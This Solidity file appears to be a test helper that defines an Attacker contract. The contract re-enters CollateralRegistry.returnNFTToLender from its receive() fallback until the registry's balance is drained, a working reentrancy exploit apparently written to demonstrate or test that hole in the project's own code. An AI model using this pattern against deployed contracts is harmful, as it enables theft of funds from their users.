// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {CollateralRegistry} from '../../src/CollateralRegistry.sol';
import {IERC721Receiver} from '@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol';

contract Attacker is IERC721Receiver {
    CollateralRegistry public immutable collateralRegistry;
    uint256 public rentalId;

    constructor(address registryAddress) {
        collateralRegistry = CollateralRegistry(registryAddress);
    }

    function setRentalId(uint256 _rentalId) external {
        rentalId = _rentalId;
    }

    function attack() external {
        collateralRegistry.returnNFTToLender(rentalId);
    }

    function onERC721Received(
        address, /* operator */
        address, /* from */
        uint256, /* tokenId */
        bytes memory /* data */
    ) public pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {
        if (address(collateralRegistry).balance > 0) {
            collateralRegistry.returnNFTToLender(rentalId);
        }
    }
} 